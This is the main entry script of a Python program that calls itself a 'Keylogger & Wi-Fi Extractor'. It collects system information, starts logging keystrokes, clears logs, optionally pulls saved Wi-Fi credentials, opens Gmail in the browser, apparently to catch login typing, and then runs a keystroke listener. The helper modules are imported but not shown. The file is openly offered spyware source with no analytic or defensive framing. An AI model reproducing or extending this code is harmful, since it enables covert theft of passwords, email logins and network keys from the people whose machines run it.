import os
import sys

from keylogger.ListenMain import start_listener
from wifi.GrabWifi import save_wifi_data
from info.system import get_systeminfo
from info.config import ENABLE_WIFI_EXTRACTION
from info.config import clear_logs
from keylogger.log_start import log_keystrokes

def main():
    print("Starting Keylogger & Wi-Fi Extractor")
    sys_info = get_systeminfo() 
    log_keystrokes(sys_info)
    clear_logs()

    if ENABLE_WIFI_EXTRACTION:
        save_wifi_data()

    os.system("start https://www.gmail.com")  

    print("Intializing..")
    try:
        start_listener()
    except KeyboardInterrupt:
        print("\nKeylogger stopped by user.")

if __name__ == "__main__":
    main()
